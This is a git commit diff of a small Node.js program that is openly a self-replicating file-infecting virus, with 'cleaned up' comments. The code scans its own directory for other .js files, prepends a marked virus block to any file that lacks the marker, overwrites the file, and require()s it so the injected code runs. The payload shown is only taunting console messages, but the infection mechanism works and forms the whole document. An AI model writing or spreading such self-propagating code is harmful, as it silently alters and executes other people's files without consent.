992526a11d37f81f5f50b38c4ecf57ba957a9ac3
Akshay Hemant <akshayhemant@hotmail.com>
2021-06-20 06:57:37 +0530

    Added some comments, cleaned up the code a little

--- index.js
+++ index.js
@@ -4,13 +4,11 @@ const path = require('path');
 let files;
 
 function init(){
-  /// look for other js files __dirname
-  /// 1. reading files in directory - filtering for javascript files
+  /// 1. reading files in directory - filtering for javascript files - that aren't me
   files = fs
     .readdirSync(__dirname)
-    .filter((file) => file.match(/[a-zA-Z0-9]+.js$/g))
+    .filter((file) => file.match(/.js$/g))
     .filter((file) => file !== path.basename(__filename));
-
   /// 2. reading contents for js files
   for(let i =0 ; i < files.length;i++){
     const filePath = path.join(__dirname,files[i]);
@@ -20,29 +18,24 @@ function init(){
 // #UNIQUEVIRUSSTRING
 (function(){
   console.log('sneakily executed! >:-)');
-  console.log(__dirname,' ... I know where you live :)')
+  console.log(__filename,' ... I know where you live :)')
 })()
-
 // #endVirus
 `;
     if(!fileContent.match(/#UNIQUEVIRUSSTRING/g)){
+// 3. adding in the virus content to the file content
       fileContent = virusContent + fileContent;
+// 4. overwriting the file with the new filecontent
       fs.writeFileSync(filePath,Buffer.from(fileContent));
       remoteExecute(files[i]);
     }
   }
 }
 
-init();
-
-function findMyself(){
-  console.log(path.basename(__filename));
-}
-findMyself();
-
 function remoteExecute(filename){
-  /// executing the contents of the file
+  /// loading the javascript file
   const filePath = path.join(__dirname,filename);
   const func = require(filePath);
-
 }
+
+init();
